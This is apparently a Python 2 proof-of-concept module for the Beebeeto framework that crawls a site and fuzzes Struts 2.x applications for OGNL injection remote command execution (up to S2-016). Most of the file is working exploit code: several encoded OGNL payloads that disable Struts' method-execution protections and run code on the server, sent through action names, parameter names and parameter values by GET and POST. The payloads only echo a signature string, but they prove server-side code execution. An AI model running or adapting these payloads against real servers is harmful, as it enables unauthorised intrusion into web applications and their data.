#!/usr/bin/env python
# coding:utf-8

'''
Struts2.x Vulnerability Scanner

== Vulnerability ==
http://struts.apache.org/downloads.html#Prior Releases

== TestCase ==
DELETED
All vulnerability case support to S2-016
to be continued
'''

import re
import sys
import copy
import urllib
import urllib2
import optparse
import urlparse
import posixpath

from baseframe import BaseFrame


class MyPoc(BaseFrame):
    poc_info = {
        # poc相关信息
        'poc': {
            'id': 'poc-2014-0013',  # 由Beebeeto官方编辑
            'name': 'Struts 2.x remote command execution POC',  # 名称
            'author': 'isqlmap',  # 作者
            'create_date': '2014-09-21',  # 编写日期
        },
        # 协议相关信息
        'protocol': {
            'name': 'http',  # 该漏洞所涉及的协议名称
            'port': [80],  # 该协议常用的端口号，需为int类型
            'layer4_protocol': ['tcp'],  # 该协议
        },
        # 漏洞相关信息
        'vul': {
            'app_name': 'Struts',  # 漏洞所涉及的应用名称
            'vul_version': ['2.x'],  # 受漏洞影响的应用版本
            'type': 'Command Execution',  # 漏洞类型
            'tag': ['Struts!', 'Command Execution', 'OGNL'],  # 漏洞相关tag
            'desc': 'Struts2.x remote command execution ',  # 漏洞描述
            'references': [
                'http://struts.apache.org/downloads.html#Prior Releases',  # 参考链接
            ],
        },
    }

    def _init_user_parser(self):
        '''options'''
        self.user_parser.add_option(
            "--data",
            dest="data",
            default=None,
            help="POST data (e.g. \"query=test\")"
        )
        self.user_parser.add_option(
            "--cookie",
            dest="cookie",
            default=None,
            help="HTTP Cookie header value"
        )
        self.user_parser.add_option(
            "--user-agent",
            dest="ua",
            default=None,
            help='HTTP User-Agent header value'
        )
        self.user_parser.add_option(
            "--referer",
            dest="referer",
            default=None,
            help="HTTP Referer header value"
        )
        self.user_parser.add_option(
            "--proxy",
            dest="proxy",
            default=None,
            help="HTTP proxy address (e.g. \"http://127.0.0.1:8080\")"
        )

    @classmethod
    def verify(cls, args):
        cls.initOptions(args['options']['proxy'],
                        args['options']['cookie'],
                        args['options']['ua'],
                        args['options']['referer'])
        result, payload, method = cls.scan(args['options']['target'])
        if args['options']['verbose']:
            print "[*] Scan results: %s vulnerabilities found" % ("possible" if result else "no")
        if result:
            print "\n[*] Payload: %s" % payload
            print "\n[*] Enjoy:)"
            args['success'] = True
            args['poc_ret']['payload'] = payload
            args['poc_ret']['method'] = method
        else:
            args['success'] = False
        return args

    exploit = verify

    # used for storing dictionary with optional header values
    _headers = {}

    @classmethod
    def initOptions(cls, proxy=None, cookie=None, ua=None, referer=None):
        if proxy:
            urllib2.install_opener(
                urllib2.build_opener(urllib2.ProxyHandler({'http': proxy}))
            )
        cls._headers.update(dict(filter(lambda item: item[1],
                                        [('Cookie', cookie),
                                         ('User-Agent', ua),
                                         ('Referer', referer)])))

    @classmethod
    def scan(cls, site):
        urls = cls.getActionUrls(site)
        for url in urls:
            print '[*] Checking url: "%s"' % url
            # fuzz action
            result, payload, method = cls.fuzzAction(url)
            if result:
                print '[+] Fuzz action find struts Vulnerability with method %s' % method
                return result, payload, method

            # to fuzz <s:a> and <s:url> tag, add a param key
            if '?' not in url:
                url += '?k=v'

            # fuzz parameter
            result, payload, method = cls.fuzzParam(url)
            if result:
                print '[+] Fuzz param find struts Vulnerability with method %s' % method
                return result, payload, method

            # fuzz value poc
            result, payload, method = cls.fuzzParamValue(url)
            if result:
                print '[+] Fuzz param value find struts Vulnerability with method %s' % method
                return result, payload, method

        return False, None, 'GET'

    @classmethod
    def getActionUrls(cls, url):
        retVal = []
        parsed_url = urlparse.urlparse(url)
        if parsed_url.path and (parsed_url.path.lower().endswith('.action')
                                or parsed_url.path.lower().endswith('.do')
                                or parsed_url.path.lower().endswith('.jsp')):
            retVal.append(url)
        links = cls.getLink(url)
        retVal.extend(links)
        retVal = list(set(retVal))
        return retVal

    @classmethod
    def getLink(cls, url):
        '''
        使用正则得到页面中.action链接
        这里随便写的几个正则，小朋友别当真
        '''
        retVal = []
        # regexp(s) used for filter target urls
        # .jsp extention is used for struts2 Vulnerability S13(http://struts.apache.org/development/2.x/docs/s2-013.html)
        regexps = (
            r'''href\s*?=\s*?(?:"|')\s*?(.*?\.action(?:.*?))['"]>''',
            r'''action\s*?=\s*?(?:"|')\s*?(.*?\.action(?:.*?))['"]>''',
            r'''src\s*?=\s*?(?:"|')\s*?(.*?\.action(?:.*?))['"]>''',
            r'''href\s*?=\s*?(?:"|')\s*?(.*?\.do(?:.*?))['"]''',
            r'''action\s*?=\s*?(?:"|')\s*?(.*?\.do(?:.*?))['"]''',
            r'''src\s*?=\s*?(?:"|')\s*?(.*?\.do(?:.*?))['"]''',
            r'''href\s*?=\s*?(?:"|')\s*?(.*?\.jsp(?:.*?))['"]''',
            r'''action\s*?=\s*?(?:"|')\s*?(.*?\.jsp(?:.*?))['"]''',
            r'''src\s*?=\s*?(?:"|')\s*?(.*?\.jsp(?:.*?))['"]''',
        )
        try:
            html = cls.queryPage(url, onlyPage=True)
            for regex in regexps:
                link = cls.findLink(url, regex, html)
                if link:
                    retVal.append(link)
        except Exception, e:
            print e
        return retVal

    @classmethod
    def queryPage(cls, url, method='GET', data=None, headers=_headers, onlyPage=False):
        '''do request and find out whether SIGNATURE is in html page'''
        retVal = False

        if isinstance(data, dict):
            data = urllib.urlencode(data)
        elif isinstance(data, basestring):
            data = cls.urlencode(data)
        else:
            data = data

        req = urllib2.Request(url, data, headers)
        try:
            response = urllib2.urlopen(req)
            page = response.read()
        except urllib2.HTTPError, error:
            page = error.read()
        except:
            page = ''

        if onlyPage:
            return page

        SIGNATURE = "7JMJJMJJ-X3Y3-9527-86F5-CGHMJSTVSMJJ"
        if SIGNATURE in page:
            retVal = True

        return retVal

    @classmethod
    def findLink(cls, url, regexp, html):
        '''
        find target url simply from html page
        return absolute url
        '''
        retVal = None
        match = re.findall(regexp, html)
        if match:
            if "http" not in match[0]:
                retVal = cls.getAbsoluteURL(url, match[0])
                return retVal
            else:
                if urlparse.urlparse(match[0]).netloc == urlparse.urlparse(url).netloc:
                    retVal = match[0]
                else:
                    retVal = url
        return retVal

    payload1 = r"#context[\"xwork.MethodAccessor.denyMethodExecution\"]=new java.lang.Boolean(false),"\
               r"#_memberAccess[\"allowStaticMethodAccess\"]=new java.lang.Boolean(true),"\
               r"#_memberAccess.excludeProperties={},"\
               r"#a_str='7JMJJMJJ-X3Y3-9527-',"\
               r"#b_str='86F5-CGHMJSTVSMJJ',"\
               r"#a_resp=@org.apache.struts2.ServletActionContext@getResponse(),"\
               r"#a_resp.getWriter().println(#a_str+#b_str),"\
               r"#a_resp.getWriter().flush(),"\
               r"#a_resp.getWriter().close()"

    payload2 = r"#context['xwork.MethodAccessor.denyMethodExecution']=false,"\
               r"#_memberAccess.allowStaticMethodAccess=true,"\
               r"#_memberAccess.excludeProperties={},"\
               r"#a_str='7JMJJMJJ-X3Y3-9527-',"\
               r"#b_str='86F5-CGHMJSTVSMJJ',"\
               r"#a_resp=@org.apache.struts2.ServletActionContext@getResponse(),"\
               r"#a_resp.getWriter().println(#a_str+#b_str),"\
               r"#a_resp.getWriter().flush(),"\
               r"#a_resp.getWriter().close()"

    # prefix suffix values used for building testing payloads
    prefixSuffixList1 = (
        (r"'+(", r")+'"), (r"(", r")(x3y3)&z[([FOO])('3y3x')]=true"),
    )

    prefixSuffixList2 = (
        (r"%{", r"}"), (r"${", r"}"),
    )

    prefixSuffixList3 = (
        (r"action:", r""), (r"redirect:", r""), ("redirectAction:", r""),
    )

    @classmethod
    def fuzzAction(cls, url):
        '''fuzz action test'''
        fileName = None
        o = urlparse.urlparse(url)
        if o.port not in [80, None]:
            reqUrl = "%s://%s:%s%s" % (o.scheme, o.hostname, o.port, o.path)
        else:
            reqUrl = "%s://%s%s" % (o.scheme, o.hostname, o.path)
        if o.path:
            path = o.path.split('/')
            path = path[-1:][0] if path else None
            fileName = cls.getFileName(path)

        sharpPoc1 = r"struts"\
                    r"&(a)(('\u0023_memberAccess.allowStaticMethodAccess\u003dtrue')(z))"\
                    r"&(b)(('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003dfalse')(z))"\
                    r"&(c)(('\u0023_memberAccess.excludeProperties\u003d{}')(z))"\
                    r"&(d)(('\u0023a_str\u003d\'7JMJJMJJ-X3Y3-9527-\'')(z))"\
                    r"&(e)(('\u0023b_str\u003d\'86F5-CGHMJSTVSMJJ\'')(z))"\
                    r"&(n)(('\u0023a_resp\u003d@org.apache.struts2.ServletActionContext@getResponse()')(z))"\
                    r"&(o)(('\u0023a_resp.getWriter().println(\u0023a_str\u002B\u0023b_str)')(z))"\
                    r"&(p)(('\u0023a_resp.getWriter().flush()')(z))"\
                    r"&(q)(('\u0023a_resp.getWriter().close()')(z))"

        sharpPoc2 = r"struts"\
                    r"&(a)(('\43_memberAccess.allowStaticMethodAccess\75true')(z))"\
                    r"&(b)(('\43context[\'xwork.MethodAccessor.denyMethodExecution\']\75false')(z))"\
                    r"&(c)(('\43_memberAccess.excludeProperties\75{}')(z))"\
                    r"&(d)(('\43a_str\75\'7JMJJMJJ-X3Y3-9527-\'')(z))"\
                    r"&(e)(('\43b_str\75\'86F5-CGHMJSTVSMJJ\'')(z))"\
                    r"&(n)(('\43a_resp\75@org.apache.struts2.ServletActionContext@getResponse()')(z))"\
                    r"&(o)(('\43a_resp.getWriter().println(\43a_str\53\43b_str)')(z))"\
                    r"&(p)(('\43a_resp.getWriter().flush()')(z))"\
                    r"&(q)(('\43a_resp.getWriter().close()')(z))"

        sharpPoc3 = r"debug=command&expression=%23f=%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29,%23f.setAccessible%28true%29,%23f.set%28%23_memberAccess,true%29,%23a=%277JMJJMJJ-X3Y3-9527-%27,%23b=%2786F5-CGHMJSTVSMJJ%27,%23resp=@org.apache.struts2.ServletActionContext@getResponse%28%29,%23resp.getWriter%28%29.println%28%23a.concat%28%23b%29%29,%23resp.getWriter%28%29.flush%28%29,%23resp.getWriter%28%29.close%28%29"

        jarPathPoc = r"class.classLoader.jarPath=("\
                     r"#context[\"xwork.MethodAccessor.denyMethodExecution\"]=new java.lang.Boolean(false),"\
                     r"#_memberAccess[\"allowStaticMethodAccess\"]=new java.lang.Boolean(true),"\
                     r"#_memberAccess.excludeProperties={},"\
                     r"#a_str='7JMJJMJJ-X3Y3-9527-',"\
                     r"#b_str='86F5-CGHMJSTVSMJJ',"\
                     r"#a_resp=@org.apache.struts2.ServletActionContext@getResponse(),"\
                     r"#a_resp.getWriter().println(#a_str+#b_str),"\
                     r"#a_resp.getWriter().flush(),"\
                     r"#a_resp.getWriter().close()"\
                     r")(x3y3)&x[(class.classLoader.jarPath)('3y3x')]=true"

        pocs = [sharpPoc1, sharpPoc2, sharpPoc3, jarPathPoc]

        for poc in pocs:
            getUrl = "%s?%s" % (reqUrl, poc)

            if cls.queryPage(getUrl, 'GET'):
                return True, getUrl, 'GET'

            elif cls.queryPage(reqUrl, 'POST', poc):
                return True, getUrl, 'POST'
            else:
                pass

        if fileName:
            payload3 = r"${"\
                       r"#a_str=new java.lang.String('7JMJJMJJ-X3Y3-9527-'),"\
                       r"#b_str=new java.lang.String('86F5-CGHMJSTVSMJJ'),"\
                       r"#a_resp=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse'),"\
                       r"#a_resp.getWriter().println(#a_str.concat(#b_str)),"\
                       r"#a_resp.getWriter().flush(),"\
                       r"#a_resp.getWriter().close()"\
                       r"}"
            prefixSuffixList = [cls.prefixSuffixList1,
                                cls.prefixSuffixList2,
                                cls.prefixSuffixList3]
            for prefix, suffix in prefixSuffixList:
                payload = r"%s%s%s" % (prefix, payload3, suffix)
                payload = cls.urlencode(payload)
                getUrl = "%s?%s" % (reqUrl, o.query) if o.query else reqUrl
                getUrl = getUrl.replace(fileName, payload)
                if cls.queryPage(getUrl, 'GET'):
                    return True, getUrl, 'GET'

        return False, url, 'GET'

    @classmethod
    def fuzzParam(cls, url):
        '''fuzz param test'''
        o = urlparse.urlparse(url)
        queryDict = cls.toParamDict(o.query)
        tempDict = copy.deepcopy(queryDict)
        if o.port not in [80, None]:
            reqUrl = "%s://%s:%s%s" % (o.scheme, o.hostname, o.port, o.path)
        else:
            reqUrl = "%s://%s%s" % (o.scheme, o.hostname, o.path)

        for param in queryDict:
            for prefix, suffix in cls.prefixSuffixList1:
                payload = r"%s%s%s" % (prefix, cls.payload1, suffix)
                tempDict[param] = payload

                queryStr = cls.toParamStr(tempDict)
                queryStr = cls.urlencode(queryStr)
                getUrl = "%s?%s" % (reqUrl, queryStr)
                if cls.queryPage(getUrl, 'GET'):
                    return True, getUrl, 'GET'
                if cls.queryPage(reqUrl, 'POST', tempDict):
                    return True, getUrl, 'POST'

            for prefix, suffix in cls.prefixSuffixList2:
                payload = r"%s%s%s" % (prefix, cls.payload2, suffix)
                tempDict[param] = payload

                queryStr = cls.toParamStr(tempDict)
                queryStr = cls.urlencode(queryStr)
                getUrl = "%s?%s" % (reqUrl, queryStr)
                if cls.queryPage(getUrl, 'GET'):
                    return True, getUrl, 'GET'
                if cls.queryPage(reqUrl, 'POST', tempDict):
                    return True, getUrl, 'POST'

        return False, reqUrl, 'GET'

    @classmethod
    def fuzzParamValue(cls, url):
        o = urlparse.urlparse(url)
        queryDict = cls.toParamDict(o.query)
        tempDict = copy.deepcopy(queryDict)
        if o.port not in [80, None]:
            reqUrl = "%s://%s:%s%s" % (o.scheme, o.hostname, o.port, o.path)
        else:
            reqUrl = "%s://%s%s" % (o.scheme, o.hostname, o.path)

        for param in queryDict:
            for prefix, suffix in cls.prefixSuffixList1:

                for i in [cls.payload1, cls.payload2]:
                    if '[FOO]' not in suffix:
                        payload = r"%s%s%s" % (prefix, i, suffix)
                        payload = cls.urlencode(payload)
                    else:
                        enPayload = cls.urlencode(i)
                        suffix = suffix.replace('[FOO]', param)
                        payload = r"%s%s%s" % (prefix, enPayload, suffix)

                    tempDict[param] = payload
                    queryStr = cls.toParamStr(tempDict)
                    getUrl = "%s?%s" % (reqUrl, queryStr)
                    if cls.queryPage(getUrl, 'GET'):
                        return True, getUrl, 'GET'
                    if cls.queryPage(reqUrl, 'POST', tempDict):
                        return True, getUrl, 'POST'
        return False, reqUrl, 'GET'

    @staticmethod
    def getFileName(path):
        retVal = None
        if not path:
            return retVal
        for i in ['.action', '.do', '.jsp']:
            if path.endswith(i):
                retVal = path.split('.')[0]
                return retVal
        return retVal

    @staticmethod
    def urlencode(value, safe="&="):
        retVal = urllib.quote(value, safe)
        return retVal

    @staticmethod
    def toParamStr(aDict):
        '''convert param dict to param string'''
        return '&'.join(['%s=%s' % (k, v) for k, v in aDict.items()])

    @staticmethod
    def toParamDict(params):
        '''convert a=1&b=2 to {'a':1,'b':2}'''
        retVal = {}
        if not params:
            return retVal
        try:
            splitParams = params.split('&')
            for element in splitParams:
                elem = element.split("=")
                if len(elem) >= 2:
                    parameter = elem[0].replace(" ", "")
                    value = "=".join(elem[1:])  # a.php?id=1&id=2&id=3
                    retVal[parameter] = value
        except Exception, e:
            print 'toFormDict error: %s' % e
        return retVal

    @staticmethod
    def getAbsoluteURL(base, url):
        '''''获取url的绝对路径'''
        url1 = urlparse.urljoin(base, url)
        arr = urlparse.urlparse(url1)
        path = posixpath.normpath(arr[2])
        return urlparse.urlunparse((arr.scheme, arr.netloc, path, arr.params, arr.query, arr.fragment))


if __name__ == '__main__':
    from pprint import pprint

    mp = MyPoc()
    pprint(mp.run())